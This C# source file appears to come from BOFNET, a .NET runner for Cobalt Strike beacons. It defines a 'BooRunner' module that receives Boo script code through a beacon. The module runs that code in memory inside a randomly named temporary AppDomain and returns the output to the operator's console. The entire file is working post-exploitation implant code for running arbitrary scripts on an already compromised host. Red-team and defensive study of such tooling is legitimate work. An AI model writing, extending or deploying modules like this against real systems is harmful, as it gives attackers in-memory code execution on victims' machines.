using BOFNET;
using BOFNET.Bofs.Boo;
using System;
using System.Linq;
using System.Reflection;
using System.Text;

namespace BOFNET.Bofs.Boo {
    public class BooRunner : BeaconObject {

        public BooRunner(BeaconApi api) : base(api) {
        }

        private static Random random = new Random();
        public static string RandomString(int length) {
            const string chars = "abcdefghijklmnopqrstuvwxysABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public override void Go(byte[] data) {

#if (NET40 || NET45 || NET472)

            if (data == null || data.Length == 0) {
                BeaconConsole.WriteLine("[!] No arguments given to run");
                return;
            }

            Unpack args = new Unpack("bZ", data);

            string booCodeStr = Encoding.UTF8.GetString((byte[])args.Values[0]);

            string[] scriptArgs = new string[] { };
            if (!string.IsNullOrEmpty((string)args.Values[1])) {
                scriptArgs = Runtime.CommandLineToArgs((string)args.Values[1]);
            }

            string temporaryAppDomainName = RandomString(10);
            AppDomain temporaryAppDomain = null;
            Runtime.AssemblyInfo runtimeAssembly = Runtime.LoadedAssemblies["BOFNET"];
  
            try {

                temporaryAppDomain = (AppDomain)InitialiseChildBOFNETAppDomain(temporaryAppDomainName, runtimeAssembly.AssemblyData, runtimeAssembly.AssemblyData.Length);

                if (temporaryAppDomain == null) {
                    BeaconConsole.WriteLine("[!] Failed to setup temporary AppDomain for Boo exection");
                    return;
                }

                string assemblyName = Assembly.GetExecutingAssembly().FullName;
                BooExecutor booExecutor = temporaryAppDomain.CreateInstanceAndUnwrap(assemblyName, "BOFNET.Bofs.Boo.BooExecutorImpl") as BooExecutor;

                booExecutor.Init(BeaconConsole);
                booExecutor.Execute(booCodeStr, scriptArgs);

            } finally {
                if(temporaryAppDomain != null)
                    AppDomain.Unload(temporaryAppDomain);
            }
#else
            BeaconConsole.WriteLine("[!] Boo execution not supported on .NET 2.0");
#endif 
        }
    }
}
